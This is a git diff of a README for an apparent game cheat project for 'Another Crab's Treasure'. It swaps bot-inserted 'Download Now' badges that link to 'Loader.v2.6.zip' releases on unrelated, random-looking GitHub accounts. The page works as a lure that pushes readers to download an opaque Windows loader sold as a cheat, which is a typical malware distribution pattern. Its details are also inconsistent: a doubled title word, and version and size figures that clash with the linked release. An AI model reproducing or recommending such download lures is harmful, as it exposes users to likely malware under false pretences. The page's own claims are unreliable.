@@ -1,17 +1,11 @@
-<!-- GHBOT-DOWNLOAD-BLOCK:START -->
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
-<!-- GHBOT-DOWNLOAD-BLOCK:END -->
-
 # 🎮 Another Crab's Treasure Cheats Cheats
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TeamHelpFortress/Humilok/releases/download/v2.6/loader.v2.6.zip)
 
-Latest Version: v1.0.0 • File Size: ~156 MB
 
 
 > ⚡ Advanced Game Modification Project for Another Crab's Treasure Cheats
 
-Latest Version: v1.0.0 • File Size: ~156 MB • Platform: Windows
+[![Download Now](https://img.shields.io/badge/Download%20Now-v2.6-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MajorRaikage45/MimiLokinil/releases/download/v2.6/Loader.v2.6.zip)
 
 !Version
 !Status
@@ -162,3 +156,4 @@ configs/
 ├── visual.cfg
 ├── player.cfg
 └── custom.cfg
+
